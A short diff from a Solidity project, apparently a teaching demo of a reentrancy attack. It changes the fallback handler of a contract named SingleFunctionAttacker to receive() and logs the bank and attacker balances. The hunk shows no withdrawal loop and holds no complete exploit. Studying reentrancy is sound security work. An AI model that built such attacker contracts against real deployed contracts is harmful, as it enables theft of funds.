@@ -13,7 +13,7 @@ contract SingleFunctionAttacker {
         etherBank = IEtherBank(_etherBankAddress);
     }
 
-    fallback() external payable {
+    receive() external payable {
         console.log("--------- Executing reentrancy attack ---------");
         console.log("Bank balance: %s", etherBank.getBalance() / 1 ether);
         console.log("Attacker balance: %s\n", address(this).balance / 1 ether);
